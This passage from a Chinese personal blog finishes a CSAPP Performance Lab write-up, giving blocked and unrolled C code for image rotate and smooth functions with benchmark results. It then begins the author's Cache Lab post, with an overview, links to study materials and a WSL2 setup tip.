class="number">24</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-26</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">25</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-27</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">26</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-28</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">27</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-29</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">28</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-30</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">29</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-31</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">30</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-32</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">31</span>, dim)];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Rotate: Version = naive_rotate: Naive baseline implementation:</span><br><span class="line">Dim             <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     <span class="number">1024</span>    Mean</span><br><span class="line">Your CPEs       <span class="number">1.4</span>     <span class="number">2.1</span>     <span class="number">3.8</span>     <span class="number">7.4</span>     <span class="number">6.5</span></span><br><span class="line">Baseline CPEs   <span class="number">14.7</span>    <span class="number">40.1</span>    <span class="number">46.4</span>    <span class="number">65.9</span>    <span class="number">94.5</span></span><br><span class="line">Speedup         <span class="number">10.3</span>    <span class="number">19.1</span>    <span class="number">12.1</span>    <span class="number">8.9</span>     <span class="number">14.6</span>    <span class="number">12.5</span></span><br><span class="line"></span><br><span class="line">Rotate: Version = rotate: Current working version:</span><br><span class="line">Dim             <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     <span class="number">1024</span>    Mean</span><br><span class="line">Your CPEs       <span class="number">1.6</span>     <span class="number">1.8</span>     <span class="number">2.1</span>     <span class="number">2.7</span>     <span class="number">5.7</span></span><br><span class="line">Baseline CPEs   <span class="number">14.7</span>    <span class="number">40.1</span>    <span class="number">46.4</span>    <span class="number">65.9</span>    <span class="number">94.5</span></span><br><span class="line">Speedup         <span class="number">9.2</span>     <span class="number">22.8</span>    <span class="number">22.0</span>    <span class="number">24.0</span>    <span class="number">16.5</span>    <span class="number">17.8</span></span><br></pre></td></tr></table></figure>

<h2 id="最优分块"><a href="#最优分块" class="headerlink" title="最优分块"></a>最优分块</h2><p>经过多轮测试，我发现 8 × 8 分块的效果是最好的，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rotate</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dim; i += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; dim; j += <span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i+<span class="number">8</span>; k++)&#123;</span><br><span class="line">                dst[RIDX(dim<span class="number">-1</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">0</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-2</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">1</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-3</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">2</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-4</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">3</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-5</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">4</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-6</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">5</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-7</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">6</span>, dim)];</span><br><span class="line">                dst[RIDX(dim<span class="number">-8</span>-j, k, dim)] = src[RIDX(k, j+<span class="number">7</span>, dim)];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Rotate: Version = naive_rotate: Naive baseline implementation:</span><br><span class="line">Dim             <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     <span class="number">1024</span>    Mean</span><br><span class="line">Your CPEs       <span class="number">1.4</span>     <span class="number">1.9</span>     <span class="number">3.6</span>     <span class="number">7.0</span>     <span class="number">6.1</span></span><br><span class="line">Baseline CPEs   <span class="number">14.7</span>    <span class="number">40.1</span>    <span class="number">46.4</span>    <span class="number">65.9</span>    <span class="number">94.5</span></span><br><span class="line">Speedup         <span class="number">10.8</span>    <span class="number">21.1</span>    <span class="number">13.0</span>    <span class="number">9.5</span>     <span class="number">15.6</span>    <span class="number">13.4</span></span><br><span class="line"></span><br><span class="line">Rotate: Version = rotate: Current working version:</span><br><span class="line">Dim             <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     <span class="number">1024</span>    Mean</span><br><span class="line">Your CPEs       <span class="number">1.4</span>     <span class="number">1.6</span>     <span class="number">1.7</span>     <span class="number">1.9</span>     <span class="number">2.4</span></span><br><span class="line">Baseline CPEs   <span class="number">14.7</span>    <span class="number">40.1</span>    <span class="number">46.4</span>    <span class="number">65.9</span>    <span class="number">94.5</span></span><br><span class="line">Speedup         <span class="number">10.1</span>    <span class="number">25.5</span>    <span class="number">27.7</span>    <span class="number">34.5</span>    <span class="number">39.3</span>    <span class="number">25.0</span></span><br></pre></td></tr></table></figure>

<p>拿到了 <strong>25 分</strong>，这个结果应该是比较理想了。</p>
<h1 id="smooth"><a href="#smooth" class="headerlink" title="smooth"></a>smooth</h1><p>这部分是将图像光滑处理，将每一个像素点的 RGB 值设置为以它为中心附近最多九块的平均值。要注意边界的情况：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220326160348748.png" alt="image-20220326160348748"></p>
<p>原始代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> red;</span><br><span class="line">    <span class="type">int</span> green;</span><br><span class="line">    <span class="type">int</span> blue;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">&#125; pixel_sum;</span><br><span class="line"><span class="comment">/* Compute min and max of two integers, respectively */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123; <span class="keyword">return</span> (a &lt; b ? a : b); &#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123; <span class="keyword">return</span> (a &gt; b ? a : b); &#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * initialize_pixel_sum - Initializes all fields of sum to 0 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">initialize_pixel_sum</span><span class="params">(pixel_sum *sum)</span> </span><br><span class="line">&#123;</span><br><span class="line">    sum-&gt;red = sum-&gt;green = sum-&gt;blue = <span class="number">0</span>;</span><br><span class="line">    sum-&gt;num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * accumulate_sum - Accumulates field values of p in corresponding </span></span><br><span class="line"><span class="comment"> * fields of sum </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">accumulate_sum</span><span class="params">(pixel_sum *sum, pixel p)</span> </span><br><span class="line">&#123;</span><br><span class="line">    sum-&gt;red += (<span class="type">int</span>) p.red;</span><br><span class="line">    sum-&gt;green += (<span class="type">int</span>) p.green;</span><br><span class="line">    sum-&gt;blue += (<span class="type">int</span>) p.blue;</span><br><span class="line">    sum-&gt;num++;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * assign_sum_to_pixel - Computes averaged pixel value in current_pixel </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">assign_sum_to_pixel</span><span class="params">(pixel *current_pixel, pixel_sum sum)</span> </span><br><span class="line">&#123;</span><br><span class="line">    current_pixel-&gt;red = (<span class="type">unsigned</span> <span class="type">short</span>) (sum.red/sum.num);</span><br><span class="line">    current_pixel-&gt;green = (<span class="type">unsigned</span> <span class="type">short</span>) (sum.green/sum.num);</span><br><span class="line">    current_pixel-&gt;blue = (<span class="type">unsigned</span> <span class="type">short</span>) (sum.blue/sum.num);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * avg - Returns averaged pixel value at (i,j) </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> pixel <span class="title function_">avg</span><span class="params">(<span class="type">int</span> dim, <span class="type">int</span> i, <span class="type">int</span> j, pixel *src)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ii, jj;</span><br><span class="line">    pixel_sum sum;</span><br><span class="line">    pixel current_pixel;</span><br><span class="line"></span><br><span class="line">    initialize_pixel_sum(&amp;sum);</span><br><span class="line">    <span class="keyword">for</span>(ii = max(i<span class="number">-1</span>, <span class="number">0</span>); ii &lt;= min(i+<span class="number">1</span>, dim<span class="number">-1</span>); ii++) </span><br><span class="line">	<span class="keyword">for</span>(jj = max(j<span class="number">-1</span>, <span class="number">0</span>); jj &lt;= min(j+<span class="number">1</span>, dim<span class="number">-1</span>); jj++) </span><br><span class="line">	    accumulate_sum(&amp;sum, src[RIDX(ii, jj, dim)]);</span><br><span class="line"></span><br><span class="line">    assign_sum_to_pixel(&amp;current_pixel, sum);</span><br><span class="line">    <span class="keyword">return</span> current_pixel;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * naive_smooth - The naive baseline version of smooth </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">naive_smooth</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dim; i++)</span><br><span class="line">	<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dim; j++)</span><br><span class="line">	    dst[RIDX(i, j, dim)] = avg(dim, i, j, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码有明显的性能缺陷：</p>
<ul>
<li>循环低效率。遍历过程中，对每一个点都调用了<code>min</code>函数、</li>
<li>没有利用循环展开</li>
</ul>
<p>思路：</p>
<ul>
<li>先对四角、四边单独处理，然后再对内部进行循环处理，这样就能避免调用<code>min</code>和<code>max</code>函数</li>
</ul>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_corner</span><span class="params">(<span class="type">int</span> cc, pixel *src, pixel *dst, <span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span>&#123;</span><br><span class="line">    dst[cc].blue = (src[cc].blue+src[a1].blue+src[a2].blue+src[a3].blue) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[cc].green = (src[cc].green+src[a1].green+src[a2].green+src[a3].green) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[cc].red = (src[cc].red+src[a1].red+src[a2].red+src[a3].red) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_top</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">    dst[j].blue = (src[j].blue+src[j+dim].blue+src[j<span class="number">-1</span>].blue+src[j+<span class="number">1</span>].blue+src[j+dim<span class="number">-1</span>].blue+src[j+dim+<span class="number">1</span>].blue)/<span class="number">6</span>;</span><br><span class="line">    dst[j].green = (src[j].green+src[j+dim].green+src[j<span class="number">-1</span>].green+src[j+<span class="number">1</span>].green+src[j+dim<span class="number">-1</span>].green+src[j+dim+<span class="number">1</span>].green)/<span class="number">6</span>;</span><br><span class="line">    dst[j].red = (src[j].red+src[j+dim].red+src[j<span class="number">-1</span>].red+src[j+<span class="number">1</span>].red+src[j+dim<span class="number">-1</span>].red+src[j+dim+<span class="number">1</span>].red)/<span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_bottom</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">    dst[j].blue = (src[j].blue+src[j-dim].blue+src[j<span class="number">-1</span>].blue+src[j+<span class="number">1</span>].blue+src[j-dim<span class="number">-1</span>].blue+src[j-dim+<span class="number">1</span>].blue)/<span class="number">6</span>;</span><br><span class="line">    dst[j].green = (src[j].green+src[j-dim].green+src[j<span class="number">-1</span>].green+src[j+<span class="number">1</span>].green+src[j-dim<span class="number">-1</span>].green+src[j-dim+<span class="number">1</span>].green)/<span class="number">6</span>;</span><br><span class="line">    dst[j].red = (src[j].red+src[j-dim].red+src[j<span class="number">-1</span>].red+src[j+<span class="number">1</span>].red+src[j-dim<span class="number">-1</span>].red+src[j-dim+<span class="number">1</span>].red)/<span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_left</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst, <span class="type">int</span> i)</span>&#123;</span><br><span class="line">    dst[i].blue = (src[i].blue+src[i-dim].blue+src[i-dim+<span class="number">1</span>].blue+src[i+<span class="number">1</span>].blue+src[i+dim].blue+src[i+dim+<span class="number">1</span>].blue)/<span class="number">6</span>;</span><br><span class="line">    dst[i].green = (src[i].green+src[i-dim].green+src[i-dim+<span class="number">1</span>].green+src[i+<span class="number">1</span>].green+src[i+dim].green+src[i+dim+<span class="number">1</span>].green)/<span class="number">6</span>;</span><br><span class="line">    dst[i].red = (src[i].red+src[i-dim].red+src[i-dim+<span class="number">1</span>].red+src[i+<span class="number">1</span>].red+src[i+dim].red+src[i+dim+<span class="number">1</span>].red)/<span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_right</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst, <span class="type">int</span> i)</span>&#123;</span><br><span class="line">    dst[i].blue = (src[i].blue+src[i-dim].blue+src[i-dim<span class="number">-1</span>].blue+src[i<span class="number">-1</span>].blue+src[i+dim].blue+src[i+dim<span class="number">-1</span>].blue)/<span class="number">6</span>;</span><br><span class="line">    dst[i].green = (src[i].green+src[i-dim].green+src[i-dim<span class="number">-1</span>].green+src[i<span class="number">-1</span>].green+src[i+dim].green+src[i+dim<span class="number">-1</span>].green)/<span class="number">6</span>;</span><br><span class="line">    dst[i].red = (src[i].red+src[i-dim].red+src[i-dim<span class="number">-1</span>].red+src[i<span class="number">-1</span>].red+src[i+dim].red+src[i+dim<span class="number">-1</span>].red)/<span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_in</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst, <span class="type">int</span> k)</span>&#123;</span><br><span class="line">    dst[k].blue = (src[k].blue+src[k<span class="number">-1</span>].blue+src[k+<span class="number">1</span>].blue+src[k+dim<span class="number">-1</span>].blue+src[k+dim].blue+src[k+dim+<span class="number">1</span>].blue+src[k-dim<span class="number">-1</span>].blue+src[k-dim].blue+src[k-dim+<span class="number">1</span>].blue)/<span class="number">9</span>;</span><br><span class="line">    dst[k].green = (src[k].green+src[k<span class="number">-1</span>].green+src[k+<span class="number">1</span>].green+src[k+dim<span class="number">-1</span>].green+src[k+dim].green+src[k+dim+<span class="number">1</span>].green+src[k-dim<span class="number">-1</span>].green+src[k-dim].green+src[k-dim+<span class="number">1</span>].green)/<span class="number">9</span>;</span><br><span class="line">    dst[k].red = (src[k].red+src[k<span class="number">-1</span>].red+src[k+<span class="number">1</span>].red+src[k+dim<span class="number">-1</span>].red+src[k+dim].red+src[k+dim+<span class="number">1</span>].red+src[k-dim<span class="number">-1</span>].red+src[k-dim].red+src[k-dim+<span class="number">1</span>].red)/<span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * smooth - Your current working version of smooth. </span></span><br><span class="line"><span class="comment"> * IMPORTANT: This is the version you will be graded on</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> smooth_descr[] = <span class="string">&quot;smooth: Current working version&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">smooth</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 处理四个角</span></span><br><span class="line">    set_corner(<span class="number">0</span>, src, dst, <span class="number">1</span>, dim, dim+<span class="number">1</span>);</span><br><span class="line">    set_corner(dim<span class="number">-1</span>, src, dst, dim<span class="number">-2</span>, dim+dim<span class="number">-2</span>, dim+dim<span class="number">-1</span>);</span><br><span class="line">    set_corner(RIDX(dim<span class="number">-1</span>, <span class="number">0</span>, dim), src, dst, RIDX(dim<span class="number">-1</span>, <span class="number">1</span>, dim), RIDX(dim<span class="number">-2</span>, <span class="number">0</span>, dim), RIDX(dim<span class="number">-2</span>, <span class="number">1</span>, dim));</span><br><span class="line">    set_corner(RIDX(dim<span class="number">-1</span>, dim<span class="number">-1</span>, dim), src, dst, RIDX(dim<span class="number">-1</span>, dim<span class="number">-2</span>, dim), RIDX(dim<span class="number">-2</span>, dim<span class="number">-2</span>, dim), RIDX(dim<span class="number">-2</span>, dim<span class="number">-1</span>, dim));</span><br><span class="line">    <span class="comment">// 处理四个边</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= dim<span class="number">-2</span>; j++)&#123;</span><br><span class="line">        set_top(dim, src, dst, j);</span><br><span class="line">        set_bottom(dim, src, dst, dim*dim-dim+j);</span><br><span class="line">        set_left(dim, src, dst, j*dim);</span><br><span class="line">        set_right(dim, src, dst, j*dim+dim<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 中间部分</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= dim<span class="number">-2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= dim<span class="number">-2</span>; j++)&#123;</span><br><span class="line">            set_in(dim, src, dst, i*dim+j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Smooth: Version = smooth: Current working version:</span><br><span class="line">Dim             <span class="number">32</span>      <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     Mean</span><br><span class="line">Your CPEs       <span class="number">9.3</span>     <span class="number">9.4</span>     <span class="number">9.4</span>     <span class="number">9.2</span>     <span class="number">9.4</span></span><br><span class="line">Baseline CPEs   <span class="number">695.0</span>   <span class="number">698.0</span>   <span class="number">702.0</span>   <span class="number">717.0</span>   <span class="number">722.0</span></span><br><span class="line">Speedup         <span class="number">75.0</span>    <span class="number">74.6</span>    <span class="number">74.4</span>    <span class="number">78.0</span>    <span class="number">76.6</span>    <span class="number">75.7</span></span><br><span class="line"></span><br><span class="line">Smooth: Version = naive_smooth: Naive baseline implementation:</span><br><span class="line">Dim             <span class="number">32</span>      <span class="number">64</span>      <span class="number">128</span>     <span class="number">256</span>     <span class="number">512</span>     Mean</span><br><span class="line">Your CPEs       <span class="number">40.2</span>    <span class="number">42.1</span>    <span class="number">42.3</span>    <span class="number">41.8</span>    <span class="number">43.5</span></span><br><span class="line">Baseline CPEs   <span class="number">695.0</span>   <span class="number">698.0</span>   <span class="number">702.0</span>   <span class="number">717.0</span>   <span class="number">722.0</span></span><br><span class="line">Speedup         <span class="number">17.3</span>    <span class="number">16.6</span>    <span class="number">16.6</span>    <span class="number">17.1</span>    <span class="number">16.6</span>    <span class="number">16.8</span></span><br></pre></td></tr></table></figure>

<p>性能相比原来提升了近 5 倍，可以说相当不错了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li><p>Performance Lab 设计得很粗糙，没有具体的评分标准，同样的代码每次运行的分数甚至还是不一样的，含金量远远不如 Architeture Lab 的 Part B 和 Cache Lab。</p>
</li>
<li><p>这个周末相当于休息了两天，养精蓄锐，迎接下周 Shell Lab 的挑战！</p>
</li>
<li><p>本实验耗时 1 天，约 3 小时</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/03/21/CSAPP-Lab05/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/21/CSAPP-Lab05/" class="post-title-link" itemprop="url">CSAPP-Lab05 Cache Lab 记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-21 19:28:24" itemprop="dateCreated datePublished" datetime="2022-03-21T19:28:24+08:00">2022-03-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-10 23:56:16" itemprop="dateModified" datetime="2022-06-10T23:56:16+08:00">2022-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP-Lab/" itemprop="url" rel="index"><span itemprop="name">CSAPP Lab</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="实验概览"><a href="#实验概览" class="headerlink" title="实验概览"></a>实验概览</h1><p>Cache Lab 分为两部分，编写一个高速缓存模拟器以及要求优化矩阵转置的核心函数，以最小化对模拟的高速缓存的不命中次数。本实验对我这种代码能力较差的人来说还是很有难度的。</p>
<p>在开始实验前，强烈建议先阅读以下<strong>学习资料</strong>：</p>
<p>实验说明文档：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/2e/cachelab.pdf">Writeup</a></p>
<p>CMU 关于 Cache Lab 的 PPT：<a target="_blank" rel="noopener" href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">Cache Lab Implementation and Blocking</a></p>
<p>CMU 关于分块优化的讲解： <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/2e/waside/waside-blocking.pdf">Using Blocking to Increase Temporal Locality</a> </p>
<p><strong>本人踩的坑：</strong>我的 lab 环境是 Windows11 + wsl2。由于 wsl2 跨 OS 磁盘访问非常慢，而我是将文件放在 Windows 下进行的实验，Part B 部分的测试结果甚至无法跑出来！所以，建议用虚拟机进行实验，如果你也是 wsl2 用户，请将实验文件放在 wsl2 自己的目录下！</p>
